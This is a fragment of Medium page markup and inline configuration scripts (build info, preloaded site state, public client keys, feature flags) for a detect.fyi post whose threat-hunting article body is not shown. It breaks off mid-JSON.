class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="wf wg l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="wf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----379a6b950492--------------------------------" rel="noopener follow"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250110-154215-d58a2d1ab2"</script><script>window.__GRAPHQL_URI__ = "https://detect.fyi/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"This request is not using the cache middleware worker","group":"disabled","tags":["group-edgeCachePosts","post-379a6b950492","user-3d60ce83d2f7","collection-d5fd8f494f6a"],"serverVariantState":"","middlewareEnabled":false,"cacheStatus":"DYNAMIC","shouldUseCache":false,"vary":[],"lohpSummerUpsellEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"COLLECTION","id":"d5fd8f494f6a","explicit":true},"viewerIsBot":false},"debug":{"requestId":"7fdbb3ff-62c7-4c2f-8a51-6213e9bd7cf7","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-ea8695ee7c95460f66e2b7b44085c375-27c79751bbe98dc6-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fdetect.fyi\u002Fplaybook-hunting-chinese-apt-379a6b950492","host":"detect.fyi","hostname":"detect.fyi","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"?source=rss-3d60ce83d2f7------2"},"config":{"nodeEnv":"production","version":"main-20250110-154215-d58a2d1ab2","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250110-154215-d58a2d1ab2","commit":"d58a2d1ab2df37007c05f758ad444c4fe1e39591"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"variantFlags":[{"__typename":"VariantFlag","name":"ios_enable_home_post_menu","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_auto_follow_on_subscribe","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses_input","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_speechify_widget","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_update_explore_wtf","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_miro_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tick_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"rex_generator_max_candidates","valueType":{"__typename":"VariantFlagNumber","value":1000}},{"__typename":"VariantFlag","name":"android_enable_syntax_highlight","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ml_rank_rex_anno","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"mobile_custom_app_icon","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"textshots_userid","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"android_rating_prompt_stories_read_threshold","valueType":{"__typename":"VariantFlagNumber","value":2}},{"__typename":"VariantFlag","name":"enable_android_dynamic_programming_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_see_pronouns","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_hybrid_ranking_model","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_medium2_kbfd","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_update_topic_portals_wtf","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_image_sharer","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_bg_post_post","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"browsable_stream_config_bucket","valueType":{"__typename":"VariantFlagString","value":"curated-topics"}},{"__typename":"VariantFlag","name":"enable_maim_the_meter","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_publication_hierarchy_web","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"reengagement_notification_duration","valueType":{"__typename":"VariantFlagNumber","value":3}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_all_recs_surfaces","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"price_smoke_test_yearly","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"enable_lite_response_markup","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_conversion_ranker_v2","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_aurora_pub_follower_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_server_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"signin_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"available_monthly_premium_plan","valueType":{"__typename":"VariantFlagString","value":"12a660186432"}},{"__typename":"VariantFlag","name":"enable_abandoned_cart_promotion_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_eventstats_event_processing","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"glyph_font_set","valueType":{"__typename":"VariantFlagString","value":"m2-unbound-source-serif-pro"}},{"__typename":"VariantFlag","name":"can_send_tips_v0","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_apple_sign_in","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_easy_resubscribe","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tribute_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_display_paywall_after_onboarding","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"redefined_top_posts","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_offline_reading","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_continue_this_thread","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_import","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"limit_post_referrers","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sms_verification_for_publish","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_friend_links_postpage_banners","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"limit_user_follows","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_friend_links_creation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_reading_history","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_iceland_nux","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_branch_io","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_access","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_editor_new_publishing_flow","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mastodon_for_members","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_friend_links_creation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pub_featuring","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_aggregator_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_signup","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_annual_plan","valueType":{"__typename":"VariantFlagString","value":"2c754bcc2995"}},{"__typename":"VariantFlag","name":"enable_speechify_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_winback_promotion_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_abandoned_paywall_promotion_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mastodon_avatar_upload","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tag_recs","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_manage_membership_flow","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_susi_redesign_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_annual_premium_plan","valueType":{"__typename":"VariantFlagString","value":"4a442ace1476"}},{"__typename":"VariantFlag","name":"enable_deprecate_legacy_providers_v3","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_plans_page_payment_form","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_app_flirty_thirty","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_author_cards","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_google_pay","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"num_post_bottom_responses_to_show","valueType":{"__typename":"VariantFlagNumber","value":3}},{"__typename":"VariantFlag","name":"enable_cancellation_discount_v1_gate","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_remove_twitter_onboarding_step","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_members_only_audio","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_publish_permission_check","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_simplified_digest_v2_b","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_boost_nia_v01","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_social_share_sheet","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"skip_fs_cache_user_vals","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_test_auth","valueType":{"__typename":"VariantFlagString","value":"disallow"}},{"__typename":"VariantFlag","name":"enable_ranker_v10","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_switch_plan_premium_tier","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_marketing_emails","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_one_tap","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_homepage","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_starspace","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_intrinsic_automatic_actions","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses_native","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"goliath_externalsearch_enable_comment_deindexation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"price_smoke_test_monthly","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"enable_author_cards_byline","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_archive_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sprig","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pre_pp_v4","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recommended_publishers_query","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sharer_validate_post_share_key","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_lists_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"can_receive_tips_v0","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_configure_pronouns","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_first_story","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_seamless_social_sharing","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_trial_membership","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tipping_v0_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recaptcha_enterprise","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_verified_author","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"onboarding_tags_from_top_views","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_cache_less_following_feed","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_c","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sharer_create_post_share_key","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_verifications_service","valueType":{"__typename":"Va